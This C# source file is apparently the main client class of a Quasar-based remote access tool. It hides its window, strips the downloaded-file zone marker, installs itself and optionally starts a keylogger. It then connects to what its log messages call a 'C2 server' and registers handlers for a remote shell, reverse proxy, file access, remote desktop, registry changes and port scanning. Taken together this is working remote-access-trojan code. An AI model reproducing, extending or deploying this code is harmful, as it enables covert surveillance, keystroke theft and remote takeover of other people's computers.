using Quasar.Client.Config;
using Quasar.Client.Logging;
using Quasar.Client.Messages;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    /// <summary>
    /// The client application which handles basic bootstrapping of the message processors and background tasks.
    /// </summary>
    public class QuasarApplication : Form
    {
        /// <summary>
        /// A system-wide mutex that ensures that only one instance runs at a time.
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// The client used for the connection to the server.
        /// </summary>
        private QuasarClient _connectClient;

        /// <summary>
        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;
        
        /// <summary>
        /// The background keylogger service used to capture and store keystrokes.
        /// </summary>
        private KeyloggerService _keyloggerService;

        /// <summary>
        /// Keeps track of the user activity.
        /// </summary>
        private ActivityDetection _userActivityDetection;

        /// <summary>
        /// Determines whether an installation is required depending on the current and target paths.
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// Notification icon used to show notifications in the taskbar.
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
        /// </summary>
        public QuasarApplication()
        {
            _messageProcessors = new List<IMessageProcessor>();
            _notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// Starts the application.
        /// </summary>
        /// <param name="e">An System.EventArgs that contains the event data.</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// Initializes the notification icon.
        /// </summary>
        private void InitializeNotifyicon()
        {
            _notifyIcon.Text = "Client\nNo connection";
            _notifyIcon.Visible = true;
            try
            {
                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                _notifyIcon.Icon = SystemIcons.Application;
            }
        }

        /// <summary>
        /// Begins running the application.
        /// </summary>
        public void Run()
        {
            // decrypt and verify the settings
            if (!Settings.Initialize())
            {
                Logger.Error("Failed to verify settings.");
                Environment.Exit(1);
            }
            Logger.Debug("Verified settings.");
                
            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
            Logger.Debug(String.Format("Created mutex {0}", Settings.MUTEX));

            // check if process with same mutex is already running on system
            if (!ApplicationMutex.CreatedNew) 
            {
                Logger.Error(String.Format("Mutex {0} already exists, exiting.", Settings.MUTEX));
                Environment.Exit(2);
            }
                
            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
            Logger.Debug(String.Format("Deleted zone identifier for application executable at {0}", Application.ExecutablePath));

            var installer = new ClientInstaller();

            // check internet connectivity
            if (!String.IsNullOrEmpty(Settings.DOWNLOADURL))
            {
                while (!CheckConnection())
                {
                    Thread.Sleep(Settings.DOWNLOADINTERVAL + new Random().Next(250, 750));
                }
            }

            if (IsInstallationRequired)
            {
                Logger.Info("Installation required. Performing installation.");
                // close mutex before installing the client
                ApplicationMutex.Dispose();

                try
                {
                    installer.Install();
                    Environment.Exit(3);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                    Logger.Error(String.Format("Failed to install: {0}", e.ToString()));
                }
            }
            else
            {
                try
                {
                    // (re)apply settings and proceed with connect loop
                    installer.ApplySettings();
                    Logger.Debug("Applied settings.");
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                    Logger.Error(String.Format("Failed to apply installer settings: {0}", e.ToString()));
                }

                if (!Settings.UNATTENDEDMODE)
                    InitializeNotifyicon();

                if (Settings.ENABLELOGGER)
                {
                    Logger.Info("Starting keylogger.");
                    _keyloggerService = new KeyloggerService();
                    _keyloggerService.Start();
                    Logger.Info("Started keylogger.");
                }
                else
                {
                    Logger.Info("Skipping keylogger.");
                }

                var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);
                Logger.Info("Initialized message processors.");

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();
                Logger.Info("Started user activity detection.");

                new Thread(() =>
                {
                    // Start connection loop on new thread and dispose application once client exits.
                    // This is required to keep the UI thread responsive and run the message loop.
                    _connectClient.ConnectLoop();
                    Environment.Exit(0);
                }).Start();
            }
        }

        private bool CheckConnection()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Settings.DOWNLOADURL);
            request.Timeout = Settings.DOWNLOADTIMEOUT;
            request.Method = "HEAD";
            try
            {
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        Logger.Debug(String.Format("Internet connection check to {0} was successful.", Settings.DOWNLOADURL));
                        return true;
                    }
                    else
                    {
                        Logger.Error(String.Format("Internet connection check to {0} was unsuccessful. HTTP status: {1}", Settings.DOWNLOADURL, response.StatusCode));
                        return false;
                    }
                }
            }
            catch (WebException ex)
            {
                Logger.Error(String.Format("Internet connection check to {0} was unsuccessful. WebExcepion: {1}", Settings.DOWNLOADURL, ex.Message));
                return false;
            }
        }

        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            if (connected) 
            {
                _notifyIcon.Text = "Client\nConnection established";
                Logger.Info("Connected to C2 server.");
            }
            else
            {
                _notifyIcon.Text = "Client\nNo connection";
                Logger.Info("Failed to connect to C2 server.");
            }
               
        }

        /// <summary>
        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
        /// </summary>
        /// <param name="client">The client which handles the connection.</param>
        /// <remarks>Always initialize from UI thread.</remarks>
        private void InitializeMessageProcessors(QuasarClient client)
        {
            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new KeyloggerHandler());
            _messageProcessors.Add(new MessageBoxHandler());
            _messageProcessors.Add(new RegistryHandler());
            _messageProcessors.Add(new RemoteDesktopHandler());
            _messageProcessors.Add(new RemoteShellHandler(client));
            _messageProcessors.Add(new ReverseProxyHandler(client));
            _messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new StartupManagerHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            _messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler());
            _messageProcessors.Add(new PortScanHandler());

            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Register(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged += ShowNotification;
            }
        }

        /// <summary>
        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
        /// </summary>
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged -= ShowNotification;
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        private void ShowNotification(object sender, string value)
        {
            if (Settings.UNATTENDEDMODE)
                return;
            
            _notifyIcon.ShowBalloonTip(4000, "Client", value, ToolTipIcon.Info);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _keyloggerService?.Dispose();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
